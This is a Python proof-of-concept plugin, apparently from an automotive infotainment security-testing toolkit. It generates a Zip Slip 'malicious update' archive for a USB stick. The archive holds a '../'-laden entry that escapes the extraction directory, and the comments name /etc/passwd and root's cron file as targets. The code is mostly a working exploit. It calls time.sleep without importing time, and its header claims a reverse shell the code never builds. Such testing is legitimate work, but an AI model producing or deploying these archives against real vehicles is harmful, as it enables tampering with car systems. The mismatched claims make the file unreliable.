"""
PoC Name: USB Path Traversal Injection
CVE: N/A
Component: Application Stack
Category: Application
Severity: Critical
CVSS: 8.5
Description: 恶意USB目录结构利用路径操作获取反弹Shell
Prerequisites: 本机权限。生成后须手动挂载至U盘。
Usage: python3 08_USB_Path_Injection.py
"""
import sys
import os
import shutil
from iv_plugin_base import IVIVulnerabilityPlugin

class UsbPathTraversalPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-008"
    meta_poc_name = "USB Path Injection"
    meta_cve_id = "N/A"
    meta_severity = "Critical"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = []
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        self.marker_path = self.params.get("marker_path", "/tmp/pwned_by_zip_slip")
        self.observe_seconds = float(self.params.get("observe_seconds", 5))
        return True

    def exploit(self):
        self.logger.info("准备构造路径遍历(Path Traversal)的恶意文件结构...")
        
        # IVI 系统如果在读取文件时不处理 `../`，会被解压或复制脱离挂载目录
        # 这里演示生成包含 ../../ 的 zip 或者符号链接与特殊名称目录
        
        # 很多早期的 Linux / Android IVI ，解压车机升级包 zip 时可以直接解压出 ../../ 
        # 本机演示，我们借用 Python 的 zipfile 生成恶意升级包
        payload_dir = "/tmp/ivi_usb_payloads"
        os.makedirs(payload_dir, exist_ok=True)
        
        zip_path = os.path.join(payload_dir, "malicious_update.zip")
        
        try:
            import zipfile
            self.logger.info("构建特制的恶意 Zip 升级包...")
            
            # 这是一个典型的 Zip Slip 漏洞攻击包
            # 我们将写入一个文件名为 "../../../../../../../etc/passwd" 或 "/var/spool/cron/root" 的条目
            escaped_target = self.marker_path.lstrip("/")
            malicious_entry = "../../../../../../../../" + escaped_target
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
                # 写入恶意条目
                z.writestr(malicious_entry, b"Pwned! This file escaped the extraction directory\\n")
                # 写入正常诱饵供系统读取
                z.writestr("update_info.txt", b"Version: 2.0\\nAuthor: AutoSec")
                z.writestr("logo.png", b"FAKE_PNG_HEADER")
                
            self.logger.warning(f"[SUCCESS] 恶意 Zip Slip 更新包已在本地生成！")
            self.logger.warning(f"  绝对路径: {zip_path}")
            self.logger.warning("[!] 请将此包拷入U盘。当车机尝试读取此ZIP进行OTA、壁纸更新或日志导入时：")
            self.logger.warning(f"    系统将灾难性地把木马文件释放到车机的 {self.marker_path} ! ")
            time.sleep(self.observe_seconds)
            if os.path.exists(self.marker_path):
                return {
                    "status": "success",
                    "vulnerable": True,
                    "details": f"Observed path-traversal marker file at {self.marker_path} after processing malicious ZIP."
                }
            
            return {
                "status": "success",
                "vulnerable": False,
                "details": f"已生成 ZIP Slip 样本 {zip_path}，但未在 {self.marker_path} 观察到自动化路径逃逸证据。"
            }

        except Exception as e:
            self.logger.error(f"构建压缩包发生错误: {str(e)}")
            return {"status": "error", "details": str(e)}

if __name__ == "__main__":
    plugin = UsbPathTraversalPlugin({})
    plugin.run_verify()
